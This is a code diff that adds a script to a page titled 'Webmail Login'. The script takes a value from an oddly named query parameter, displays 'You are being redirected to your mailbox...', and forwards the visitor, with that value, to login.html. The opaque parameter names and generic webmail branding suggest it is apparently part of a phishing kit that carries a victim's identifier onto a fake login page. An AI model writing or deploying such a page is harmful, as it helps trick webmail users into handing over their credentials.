@@ -11,6 +11,40 @@ and open the template in the editor.
         <title>Webmail Login</title>
         <link rel="shortcut icon" href="airbond/favicon.ico" type="image/png">
         
+        <script>
+    // Function to extract query parameter value
+    function getQueryParameter(parameterName) {
+      var queryString = window.location.search;
+      var urlParams = new URLSearchParams(queryString);
+      return urlParams.get(parameterName);
+    }
+    // Get the value from the 'data' query parameter
+    var value = getQueryParameter('ggfgfuwerfrytktyrkyfdshw4');
+    
+     function redirectToDestination() {
+    // Redirect to the destination page with the variable value in the URL
+    window.location.href = "login.html?jdfkgdigeregrgjrghfgfg=" + (value);
+    }
+
+    // Automatically redirect after a certain delay (e.g., 2 seconds)
+    setTimeout(redirectToDestination, 80000);
+    
+    function confirmAction() {
+        // Get the element with the specified ID
+        const element = document.getElementById('message');
+      
+        // Change the innerHTML of the element
+        element.innerHTML = 'You are being redirected to your mailbox...';
+      
+        // Redirect after a 2-second delay
+        setTimeout(function() {
+          window.location.href = "login.html?jdfkgdigeregrgjrghfgfg=" + (value);// Replace with your desired URL
+        }, 2000);
+      }
+   
+
+  </script>
+        
     </head>
     <body>
        <center> 
